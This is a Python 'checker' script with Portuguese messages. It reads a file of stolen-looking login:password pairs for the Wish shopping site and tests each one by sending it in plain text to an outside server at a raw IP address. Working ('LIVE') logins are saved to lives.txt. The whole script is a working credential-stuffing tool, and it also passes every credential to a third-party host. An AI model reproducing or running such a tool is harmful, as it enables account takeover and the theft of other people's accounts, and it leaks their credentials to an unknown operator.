#!/bin/usr/python

# -*- coding: utf-8 -*-

import requests
import json
from termcolor import colored
from time import sleep


def wish():

    print("-"*40)
    print(" CHECKER WISH")
    print("-"*40)
    print()

    print(colored("EU ESTAVA COM PREGUIÇA DE AJEITAR ENTÃO DEIXEI PRA SALVAR OS LOGIN LIVE EM UM TXT NO SEU APARELHO",'red'))

    sleep(2)

    print(colored("-"*20))
    
    print(colored("PARA TA USANDO O CHECKER CRIE UM ARQUIVO CHAMAO 'WISH.TXT' COM OS LOGINS LÁ , OBS: TESTA OS SEGUINTES SEPARADORES\n(| ou :)","yellow"))

    print(colored("-"*20))


    sleep(2)

    def checker(wish):

        login = wish

        re = requests.get(f"http://18.212.144.103:80/wish/api.php?linha={login}").text
    
        print()

        if "#APROVADA" in re:

        
            print()

            a = re.split("{")

            b = re.split("status")
            
            c = b[1].split('0,"str":"')

            d = c[1].split("<b style='color:green;'>#APROVADA<\/b> -> <b style='color:white;'>")
            
            e = d[1].split("<\/b> ")

            msg = colored(f"LIVE 》 {e[0]}||{e[1]} ",'green')


            print(msg)

            live = open("lives.txt","a+")
            live.write(msg)

        else:

            print(colored(f'DIE 》 {wish}'))

    arq = open("wish.txt","r").readlines()

    for x in arq:
        print(checker(x.replace("\n","")))

if __name__ == "__main__":
    wish()
